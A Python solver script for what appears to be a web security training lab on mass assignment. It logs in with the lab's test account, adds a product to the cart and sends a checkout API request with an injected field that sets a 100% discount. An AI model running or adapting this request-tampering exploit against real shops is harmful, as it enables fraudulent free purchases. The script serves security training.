import sys
import requests
import urllib3
import json
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Lab: Exploiting a mass assignment vulnerability
def login(session, target_host):
    """Logs into the target website and retrieves a CSRF token needed for authentication."""
    url = f"https://{target_host}/login"

    # Get CSRF token from the login page
    csrf_response = session.get(url, verify=False)

    # Check if the host is responding
    if csrf_response.status_code == 504:
        print('(!) Host down.')
        sys.exit(-1)

    soup = BeautifulSoup(csrf_response.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})['value']

    # Login request using predefined credentials
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    login_response = session.post(url, data=data, verify=False, allow_redirects=False)

    # Check if login was successful (302 indicates redirection after login)
    if login_response.status_code == 302:
        print('(+) Successfully logged into the account.')
        return session
    else:
        print('(!) Error while trying to log in.')
        sys.exit()


def mass_assignment(session, target_host):
    """Attempts to exploit a mass assignment vulnerability by applying a 100% discount."""
    
    # Add the product to the shopping cart
    url_add_product = f"https://{target_host}/cart"
    product_data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
    response_add_product = session.post(url_add_product, data=product_data, verify=False, allow_redirects=False)

    print('(+) Adding product to the cart...')
    if response_add_product.status_code == 302:
        print('(+) Product successfully added to the cart.')
        print('(+) Proceeding to checkout...')

        # Exploit mass assignment to apply 100% discount
        buy_url = f"https://{target_host}/api/checkout"
        headers = {"Content-Type": "application/json"}
        data = {
            "chosen_discount": {"percentage": 100},
            "chosen_products": [{"product_id": "1", "quantity": 1}]
        }

        buy_response = session.post(buy_url, json=data, headers=headers, verify=False)

        if buy_response.status_code == 201:
            print('(+) Congratulations, you solved the lab!')
        else:
            print(f'(!) Error: Lab not solved. Response Code: {buy_response.status_code}')
            print(f'(!) Response Content: {buy_response.text}')
            sys.exit()
    else:
        print('(!) Error: Failed to add product to the cart.')
        sys.exit()


def main():
    """Main function to run the exploit. It requires a target URL as an argument."""
    if len(sys.argv) != 2:
        print(f'(!) Usage: {sys.argv[0]} <url>')
        print(f'(!) Example: {sys.argv[0]} xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net')
        sys.exit()

    # Create a session to maintain authentication and cookies
    session = requests.session()
    target_host = sys.argv[1]

    # Perform login and execute the exploit
    session = login(session, target_host)
    mass_assignment(session, target_host)


if __name__ == "__main__":
    main()
